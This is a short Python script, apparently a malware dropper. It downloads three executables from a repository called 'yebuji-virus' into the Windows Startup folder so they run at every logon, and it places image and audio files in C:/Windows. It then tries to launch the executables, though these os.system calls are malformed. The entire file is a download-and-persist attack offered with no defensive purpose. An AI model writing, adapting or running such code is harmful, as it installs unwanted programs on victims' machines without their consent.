import urllib.request
import os

def down(url,name):
    with urllib.request.urlopen(url) as downs:
        neirong=downs.read()
        f_name=name
        with open(f_name,'wb') as file:
            file.write(neirong)


fnames= "C:/Users/{0}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/".format(os.getlogin())
down("https://github.com/him114514/yebuji-virus/releases/download/%E4%B8%BB%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9D%97%EF%BC%88%E7%BB%84%E4%BB%B61%EF%BC%89/frame_main.exe",fnames+'frame_main.exe')
down("https://github.com/him114514/yebuji-virus/releases/download/%E6%A8%A1%E5%9D%972/frame_B1.exe",fnames+'frame_B1.exe')
down("https://github.com/him114514/yebuji-virus/releases/download/%E6%A8%A1%E5%9D%973/frame_B2.exe",fnames+'frame_B2.exe')
down("https://i0.hdslb.com/bfs/new_dyn/c7e3de571c31710d25dcf8029d0a2dd1590491558.png@1036w.webp","C:/Windows/lp.png")
down("https://github.com/him114514/yebuji-virus/raw/main/jiji.bmp","C:/Windows/jiji.bmp")
down("https://github.com/him114514/yebuji-virus/raw/main/%E7%B2%BE%E7%A5%9E%E7%97%85%E6%8B%89%E9%9D%A2.MP3","C:/Windows/精神病拉面.MP3")
os.system('start',fnames+'frame_B2.exe')
os.system('start',fnames+'frame_main.exe')
os.system('start',fnames+'frame_B1.exe')
